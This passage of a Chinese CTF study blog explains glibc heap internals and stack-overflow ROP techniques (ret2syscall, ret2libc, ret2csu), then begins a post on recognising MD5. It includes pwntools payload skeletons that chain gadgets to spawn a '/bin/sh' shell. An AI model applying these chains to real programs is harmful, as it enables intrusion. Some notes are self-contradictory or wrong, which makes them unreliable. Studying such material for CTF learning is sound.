<p><strong>左边的这个本身就是一个堆块，用来存放一些全局信息</strong>。比如 max_size 存储了能够存储的最大结构数量；exist_num 表示已经存储的结构的数量。</p>
<h3 id="IDA-中常见的指针表示形式"><a href="#IDA-中常见的指针表示形式" class="headerlink" title="IDA 中常见的指针表示形式"></a>IDA 中常见的指针表示形式</h3><p>在 IDA 伪代码中的指针形式形如下面的情况：</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">*(qword_6020A8 + <span class="number">8</span>)</span><br></pre></td></tr></table></figure>

<p><strong>表示取到 qword_6020A8 这个地址加 8 偏移的那个地址存储的值</strong></p>
<p>汇编代码等同于：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">.text:0000000000400F85                 mov     rax, cs:qword_6020A8</span></span><br><span class="line"><span class="section">.text:0000000000400F8C                 mov     rax, [rax+8]</span></span><br></pre></td></tr></table></figure>

<p>简单转化一下，也就是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*(addr) = [addr]</span><br></pre></td></tr></table></figure>

<h3 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h3><p>在 pwn 的堆题目中，经常会有像一些”笔记管理系统”之类的题目，例如下面这里例子</p>
<p><img src="/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/9mQhGPF.png" alt="img"></p>
<p>代码提供了最基本的增删查改的功能。这个”笔记”的数据结构<strong>通常就是使用链表连接起来的</strong>，记录了当前 note 的大小、属性、内容等等。</p>
<p><strong>例如，下面这个例子就是以指针为基础来存储这个 note 结构的</strong>。这里的 i 代表 note 的索引，若这里的 i &#x3D; 0 时：</p>
<p><img src="/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/n366Lzt.png" alt="img"></p>
<p><em>(qword_6020A8 + 16) 就*<em>代表从 qword_6020A8 这个地址出再往后偏移 16 个字节，取到这个地址存储的值，接着把 1 赋值给这个地方（也就是把 1 存入这个地址）</em></em></p>
<p>同样的 *(qword_6020A8 + 24) 就代表偏移 24 个字节处的值为 len</p>
<p>依次类推就可以在<strong>不连续的内存空间中</strong>，把整个 note 的数据结构存储下来了。</p>
<h2 id="申请堆的本质"><a href="#申请堆的本质" class="headerlink" title="申请堆的本质"></a>申请堆的本质</h2><blockquote>
<p>堆管理器 ptmalloc2 主要是通过 malloc&#x2F;free 函数来分配和释放内存块。</p>
</blockquote>
<p>ptmalloc2 的作用通俗的讲就是<strong>相当于一个”中间商”</strong>，在程序想要申请向系统申请堆空间时，这里的 ptmalloc2 就会申请一块很大的空间，并根据算法从这些内存中把空间真正的分配给程序。</p>
<p>简单点说就是下面这个图中的情况：</p>
<p><img src="/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/OHeE6wZ.png" alt="img"></p>
<p>例子</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">char</span> *p;</span><br><span class="line">    p=<span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 gdb 中进行调试，在 call malloc 处下一个断点，<strong>在这里使用 vmmap 命令，查看内存分布</strong>。可以看到此时并没有发现堆段</p>
<p><img src="/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/AmbgBDz.png" alt="img"></p>
<p>单步 n ，vmmap 命令再次查看内存，发现出现了堆段</p>
<p><img src="/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/4J2yIhn.png" alt="img"></p>
<p>但是这里我们明明只是申请了 10 字节的大小，但是为什么这里的为什么给了这么大的堆段呢？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x00602000     ~    0x00623000</span><br></pre></td></tr></table></figure>

<p>计算一下，刚好是 132 kB</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(0x00623000-0x00602000)/1024 = 132 kB</span><br></pre></td></tr></table></figure>

<blockquote>
<p>原来这132KB的堆空间叫做arena，此时因为是主线程分配的，所以这个区域叫做 main arena</p>
</blockquote>
<p>也就是说这 132 KB 是”厂家”（内核）批发给”中间商”（ptmalloc2）的货物，<strong>以便下次程序在向系统申请小内存的时候，直接去”中间商”去取就行了</strong>，他就会在这 132KB 中按照要申请”货物”的多少进行分配下去。若”中间商”缺货了话，ptmalloc2 就继续去找”厂家”（系统内核）去取货</p>
<h3 id="查看已分配的堆内存分布"><a href="#查看已分配的堆内存分布" class="headerlink" title="查看已分配的堆内存分布"></a>查看已分配的堆内存分布</h3><p>在上面我们动态调试的时候已经执行了 malloc 函数，申请到的堆指针是保存在 eax 中的<br><img src="/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/YTz6loS.png" alt="img"></p>
<p>我们这里使用下面这个命令来查看内存堆块情况：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x/32gx 0x602010-0x10</span><br></pre></td></tr></table></figure>

<ul>
<li>32位的程序使用 x&#x2F;32xw 比较直观一点</li>
</ul>
<p>这里减去 0x10 表示从堆块的头部开始观察（包含 pre size 和 size 字段）</p>
<p><img src="/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/TEiVMUc.png" alt="img"></p>
<h2 id="main-arena和top-chunk"><a href="#main-arena和top-chunk" class="headerlink" title="main_arena和top chunk"></a>main_arena和top chunk</h2><p><strong>1.main_arena</strong>是ptmalloc2堆管理器与1操作系统内核进行交互申请得到的，也就是上边申请的132KB，因为是主线程分配的，所以叫main_arena(通过增加program break loction)的方式增加main_arena的大小，在gdb调试中通过**”x&#x2F;32gx &amp;main_arena”**可以看到main_arena的内存分配情况。、</p>
<p><strong>2.top chunk</strong>是堆中的一个堆块，带头的。程序以后分配的内存都要放在它的后边。在程序在向堆管理器申请内存的时候，没有合适的内存空间分配给它时，此时会从top chunk上剪切一部分chunk分配给它</p>
<h2 id="free函数和bins"><a href="#free函数和bins" class="headerlink" title="free函数和bins"></a>free函数和bins</h2><h3 id="free函数"><a href="#free函数" class="headerlink" title="free函数"></a>free函数</h3><p>free函数与bins的分配息息相关。</p>
<p>例子</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> *p;</span><br><span class="line">        p = <span class="built_in">malloc</span>(<span class="number">10</span>)；</span><br><span class="line">            <span class="built_in">memcpy</span>(p,<span class="string">&quot;Hello&quot;</span>,<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>程序将 “Hello” 字符串复制到申请到的堆内存空间中。</li>
</ul>
<p>编译后用 gdb 调试，在 call memcpy 处下一个断点，单步后将 “Hello” 复制到堆块中</p>
<p><img src="/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/MK9NWa8.png" alt="img"></p>
<p>继续使用 x&#x2F;32gx 0x602010-0x10 命令查看堆块情况</p>
<p><img src="/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/SkUxKXN.png" alt="img"></p>
<p>继续单步 n，执行 free 函数之后，查看堆块情况</p>
<p><img src="/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/iifOKJV.png" alt="img"></p>
<p>这里可以看出原本堆块中存储的内容已经被清空，然后<strong>查看一下 main_arena 的值，发现其中 +0x8 的偏移处</strong>，存储了指向已经 free 了的指针（指向头部，而不是 user data）</p>
<p>调用free函数，清空此堆块的use_data,并将此堆块的指针存储在main_arena中，或者fast_bin中。</p>
<h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><p>bins这个概念与内存回收相关，堆管理器会根据用户已经申请到的内存空间大小进行释放，来决定放入哪类bins中，相当于垃圾分类。</p>
<p><strong>描述</strong></p>
<p>1.用户free掉的内存并不会马上还给系统，ptmalloc会统一管理heap和mmap映射区域中的空闲的chunk</p>
<p>2.当用户进行下一次分配请求时，ptmalloc会首先试图在空闲的chunk中挑选一块给用户，避免了频繁的系统调用。</p>
<p>3.ptmalloc将相似的chunk用双链表连接起来，这样的一个链表称为bin</p>
<p>4.ptmalloc一共维护了128个bin，并使用一个数组来存储这些bin</p>
<p>5.堆管理器将bin分为四类：<strong>fastbin|unsortedbin|smallbin|largebin</strong></p>
<p>6.数组中bin 1为unsortedbin；2<del>63为smallbin；64</del>126为largebin</p>
<p>![](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-03-18 192154.png)</p>
<h4 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h4><p>为了快速重新分配回内存而存在的结构，fastbin是使用最多的一类，结构也很简单</p>
<blockquote>
<p>fastbin所包含的chunk大小为16，24，32，80bytes。当分配一块较小的内存（&lt;&#x3D;64bytes），会首先在fastbin中移除并返回；否则通过其他方式(剪切top chunk)得到一块符合大小的chunk并返回。</p>
</blockquote>
<p><strong>描述</strong></p>
<p>1.在32位操作系统中，当用户释放的堆块大小小于64B时使用fastbin进行管理，即chunk   空间最大为80字节<br>2.fastbin只使用了fd成员，是个单链表结构<br>3.fastbin不会对P位进行操作，也就是说它不会主动进行合并；只有在某些特定情况下，堆管理器才会对fastbin进行合并<br>4.fastbinY为管理fastbin的数组，每个成员分别管理不同大小的fastbin链表，且均指向了当前链表的尾节点，当尾节点被分配时，通过其fd指针指向前一个结点<br>5.当用户申请chunk大小小于或等于MAX_FAST_SIZE时，优先从fastbins中查找相应的空闲块，且规则为LIFO（Last in, first out, 后进先出）</p>
<p>例子</p>
<p><img src="/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/image-20230318193939959.png"></p>
<p>此时0x0804a00处的chunk(实际chunk的size段要减去PREV_INUSE字段值1)被free，那么会被存储在40bytes的fastbin的内存地址中（地址存储的是指针，64位地址占8个字节），在main_arena中表示16，24，82，，，，，80bytes的内存地址中分别已经存储了已经free的而且满足相同大小的chunk。</p>
<p><strong>fastbin的特性</strong></p>
<p><strong>1.使用单链表来维护释放的堆块</strong></p>
<p><img src="/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-18%20195928.png"></p>
<p><strong>2.使用先进后出的方式维护链表</strong></p>
<p>当程序需要重新malloc内存并且从fastbin中挑选堆块，会选择后边的新加入的堆块拿来进行内存分配，这里的话也就是直接使用第二次释放的堆块，将这个堆块从链表中移除，根据fk指针找到这个堆块，此时main_arena也指向这里</p>
<h3 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h3><p><strong>描述</strong>：</p>
<ol>
<li><p>当释放较小或较大的chunk的时候，为了增加分配效率，系统会先将最近释放的chunk添加到unsorted bin中</p>
</li>
<li><p>unsorted bin 为一个双向循环链表，对chunk的大小没有限制，即任何大小的chunk都可以放入unsorted bin链表中</p>
</li>
<li><p>当fastbin，smallbin中的chunk不能满足用户申请的chunk的大小时，堆管理器会考虑使用unsortedbin。它会在分配large chunk之前对堆中碎片进行合并，以减少对中的碎片。</p>
<p>unsortedbin使用的是双链表对chunk进行链接，可以看成不满足能够进行内存分配的堆块都放在unsortedbin中</p>
</li>
</ol>
<h4 id="smallbin"><a href="#smallbin" class="headerlink" title="smallbin"></a>smallbin</h4><p><strong>描述：</strong></p>
<ol>
<li>在32位操作系统中，当用户释放的堆块大小大于64B，小于等于512B时使用small bin进行管理</li>
<li>small bin 为双向循环链表，且使用 FIFO（First in, first out, 先入先出） 算法</li>
<li>当满足small bin条件的chunk被释放后，会优先被放入unosrted bin，只有在一定情况下，才会被分配到small bin中</li>
<li>相邻的free chunk将会被合并成一个更大的fee chunk，增加内存利用率</li>
</ol>
<h1 id="深入理解堆"><a href="#深入理解堆" class="headerlink" title="深入理解堆"></a>深入理解堆</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p><strong>堆管理器处于用户程序和内核中间主要做以下工作：</strong></p>
<p>1.响应用户申请的内存，向操作系统申请内存，然后返回给用户程序。</p>
<p>2.管理用户释放的内存</p>
<p>注意：在内存分配与使用的时候，linux有一个基本内存管理思想，只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系。所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实是虚拟内存。只有当用户使用相应内存的时候，系统才会真正分配物理页面给用户使用。</p>
<h2 id="堆的基本操作"><a href="#堆的基本操作" class="headerlink" title="堆的基本操作"></a>堆的基本操作</h2><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><p>malloc函数返回对应大小字节内存的指针，还进行了对异常情况的处理。如果申请的字节数为0，返回当前系统允许的堆的最小内存。如果申请的字节数为负数的时候，由于在大多数系统上，size_t是无符号数，所以程序就会申请很大的内存空间，通常会失败，因为没有足够的空间可以分配。</p>
<h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p>free函数会释放由p指向的内存块，这个内存块可以通过malloc或者相关函数realloc得到的。同时也进行了对异常情况进行了处理。</p>
<p>当p为空指针，函数不执行。</p>
<p>当p已经释放，再次释放会出现乱七八糟的情况，这就是double free。</p>
<h2 id="内存分配后的系统调用"><a href="#内存分配后的系统调用" class="headerlink" title="内存分配后的系统调用"></a>内存分配后的系统调用</h2><p>无论是malloc函数还是free函数，我们动态申请或者释放内存的时候，都经常使用，但是它们并不是与系统进行交互的函数。这些函数背后的系统调用只要是(s)brk以及mmap，munmap函数。</p>
<h3 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h3><blockquote>
<p>对于堆的操作，操作系统提供了brk函数，glibc库提供了sbrk函数</p>
<p>malloc的底层实现，用于分配开辟内存，但是brk函数是系统调用而sbrk不是，sbrk调用了sbrk</p>
</blockquote>
<p>初始时，堆的起始地址start_brk以及堆的末尾brk指向同一地址。根据是否开启ASLR，两者的具体位置会不同。开启时start_brk和brk都指向data&#x2F;bss段的结尾；开启后，start_brk和brk也会指向同一位置，只是这个位置在data&#x2F;bss段的随机位置</p>
<h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><p>malloc会使用mmap来创建独立的匿名映射段。匿名映射主要目的主要是可以申请以0填充的内存，并且仅被调用进程所使用</p>
<h3 id="多线程支持"><a href="#多线程支持" class="headerlink" title="多线程支持"></a>多线程支持</h3><p>在原有的dlmalloc实现中，当两个线程要申请内存时，只有一个线程可以进入临界区申请内存，而另外的一个线程则必须等待知道临界区不再有线程。这是因为所有线程共享一个堆。在glibc的ptmalloc实现中，比较好的一点就是支持了多线程的快速访问。在新的实现中，所有的线程共享多个堆。</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>栈复习与深度学习</title>
    <url>/2023/04/20/%E6%A0%88%E5%A4%8D%E4%B9%A0%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p><strong>前言：</strong>最近开始学堆了，但是栈方面只掌握一些的简单的rop利用，之所以写这个文章就是想着先进行复习再继续学习栈的高级利用方式（堆学习也不会落下），前面可能写的比较简单，后面的高级利用会进行详写。（文章学习来自Wiki）</p>
<h1 id="stack-overflow"><a href="#stack-overflow" class="headerlink" title="stack overflow"></a>stack overflow</h1><h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><p>栈是一种先进后出的数据结构，操作主要有压栈(push)和出栈(pop),汇编语言运行时，会充分利用栈，每个程序运行时都有虚拟地址空间，其中一部分就是该程序对应的栈，保存函数调用信息和局部变量。程序的栈从进程地址空间的高地址向低地址增长的。</p>
<h3 id="基本rop"><a href="#基本rop" class="headerlink" title="基本rop"></a>基本rop</h3><p>nx保护开启会使栈上或堆上注入代码的方式难以发挥攻击的效果，所以我们需要用ROP来绕过保护，主要思想为在栈缓冲区溢出的基础上，利用程序已有的小片段来改变寄存器或者变量的值，控制程序的执行流程，gadget主要以ret来结尾的指令序列，ret改变了程序的执行顺序。</p>
<h4 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h4><p>控制程序执行程序本身已有的代码(.text)。找到漏洞函数和后门函数的地址，控制程序返回后门函数就可以getshell了，确定我们能够控制的内存的起始地址距离main函数的返回地址的字节数进行覆盖</p>
<h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>控制程序执行shellcode代码，shellcode是用于完成某个功能的汇编代码，常用于获取目标系统的shell，shellcode需要我们自己来填充，填充的区域需要具有可执行权限。</p>
<h4 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h4><p>控制系统调用从而getshell，简单说就是把对应的系统调用的参数放在对用的寄存器中，然后执行 int 0x80就可以执行对应的系统调用，比如利用**execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)**来getshell，假如程序为32位，首先eax系统调用号eax应为0xb（execve的系统调用好），第一个参数即ebx应指向&#x2F;bin&#x2F;sh的地址，执行sh的地址也可以，第二个参数即ecx应为0，第三个参数edx应0。然后通过gadgets控制这些寄存器</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flat([<span class="string">&#x27;A&#x27;</span> *n, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br></pre></td></tr></table></figure>

<h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h4><p>控制程序执行libc中的函数，通常返回某个函数的plt处或者函数的具体位置(函数对应got表的的内容)，一般情况会使用system(“bin&#x2F;sh&#x2F;“),一个小细节是正常调用函数时，调用的时候会有一个对应的返回地址，需要用’bbbb’或者’bbbbbbbb’作为虚假地址，其后参数对应的参数内容</p>
<p>1</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flat([<span class="string">&#x27;a&#x27;</span> * n, system_plt, <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span>, binsh_addr])</span><br></pre></td></tr></table></figure>

<p>2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flat([<span class="string">&#x27;a&#x27;</span> * n, gets_plt, pop_ebx, buf2, system_plt, <span class="number">0xdeadbeef</span>, buf2])</span><br></pre></td></tr></table></figure>

<p>这里是向bss段的buf2处写入&#x2F;bin&#x2F;sh字符串</p>
<p>3</p>
<p>泄露函数地址-&gt;找到libc版本-&gt;获取system与bin&#x2F;sh&#x2F;的地址-&gt;再次执行源代码-&gt;触发栈溢出执行system(&#x2F;bin&#x2F;sh)</p>
<h3 id="中级rop"><a href="#中级rop" class="headerlink" title="中级rop"></a>中级rop</h3><h4 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h4><p>在64位程序中，函数的前六个参数是通过寄存器传递的，但是有些情况下，我们找不到对应寄存器的gadgets，所以这个时候就要利用x64下的_libc_csu_init中的gadgets。这个函数是对libc进行初始化操作，正常程序都会调用libc函数，所以这个函数一定存在。不同版本的_libc_csu_init不一样</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 <span class="built_in">test</span>    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure>

<hr>
<p>从 0x000000000040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制rbx,rbp,r12,r13,r14,r15 寄存器的数据</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br></pre></td></tr></table></figure>

<p>从 0x0000000000400600 到 0x0000000000400609，我们可以将 r13 赋给 rdx, 将 r14 赋给 rsi，将 r15d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，<strong>但其实此时 rdi 的高 32 位寄存器值为 0（自行调试）</strong>，所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br></pre></td></tr></table></figure>

<p>从 0x000000000040060D 到 0x0000000000400614，我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 &#x3D; rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx&#x3D;0，rbp&#x3D;1。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>常见加密算法和编码识别</title>
    <url>/2023/04/10/%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%92%8C%E7%BC%96%E7%A0%81%E8%AF%86%E5%88%AB/</url>
    <content><![CDATA[<p>参考资料来自wiki</p>
<p>在对数据进行变换的过程中，除了简单的字节操作之外，还会使用一些常用的编码加密算法，因此如果能够快速识别出对应的编码或者加密算法，就能更快的分析出整个完整的算法。CTF 逆向中通常出现的加密算法包括 base64、TEA、AES、RC4、MD5 等。下面介绍一些实用的逆向分析技巧</p>
<h2 id="Hash算法"><a href="#Hash算法" class="headerlink" title="Hash算法"></a>Hash算法</h2><h3 id="1-MD5-PEID可以看到MD5"><a href="#1-MD5-PEID可以看到MD5" class="headerlink" title="1.MD5(PEID可以看到MD5)"></a>1.MD5(PEID可以看到MD5)</h3><p><strong>MD5 消息摘要算法</strong>（英语：MD5 Message-Digest Algorithm），一种被广泛使用的<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A2%BC%E9%9B%9C%E6%B9%8A%E5%87%BD%E6%95%B8">密码散列函数</a>，可以产生出一个 128 位（16 <a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E8%8A%82">字节</a>）的散列值（hash value），用于确保信息传输完整一致。</p>
<p>伪代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/<span class="title class_">Note</span>: <span class="title class_">All</span> variables are unsigned <span class="number">32</span> bits and wrap modulo <span class="number">2</span>^<span class="number">32</span> when calculating</span><br><span class="line"><span class="keyword">var</span> int[<span class="number">64</span>] r, k</span><br><span class="line"></span><br><span class="line"><span class="comment">//r specifies the per-round shift amounts</span></span><br><span class="line">r[ <span class="number">0.</span><span class="number">.15</span>]：= &#123;<span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>,  <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>,  <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>,  <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>&#125; </span><br><span class="line">r[<span class="number">16.</span><span class="number">.31</span>]：= &#123;<span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>,  <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>,  <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>,  <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>&#125;</span><br><span class="line">r[<span class="number">32.</span><span class="number">.47</span>]：= &#123;<span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>,  <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>,  <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>,  <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>&#125;</span><br><span class="line">r[<span class="number">48.</span><span class="number">.63</span>]：= &#123;<span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>,  <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>,  <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>,  <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Use binary integer part of the sines of integers as constants:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">from</span> <span class="number">0</span> to <span class="number">63</span></span><br><span class="line">    k[i] := <span class="title function_">floor</span>(<span class="title function_">abs</span>(<span class="title function_">sin</span>(i + <span class="number">1</span>)) × <span class="number">2</span>^<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//Initialize variables:</span></span><br><span class="line"><span class="keyword">var</span> int h0 := <span class="number">0x67452301</span></span><br><span class="line"><span class="keyword">var</span> int h1 := <span class="number">0xEFCDAB89</span></span><br><span class="line"><span class="keyword">var</span> int h2 := <span class="number">0x98BADCFE</span></span><br><span class="line"><span class="keyword">var</span> int h3 := <span class="number">0x10325476</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Pre-processing:</span></span><br><span class="line">append <span class="string">&quot;1&quot;</span> bit to message</span><br><span class="line">append <span class="string">&quot;0&quot;</span> bits until message length <span class="keyword">in</span> bits ≡ <span class="number">448</span> (mod <span class="number">512</span>)</span><br><span class="line">append bit length <span class="keyword">of</span> message <span class="keyword">as</span> <span class="number">64</span>-bit little-endian integer to message</span><br><span class="line"></span><br><span class="line"><span class="comment">//Process the message in successive 512-bit chunks:</span></span><br><span class="line"><span 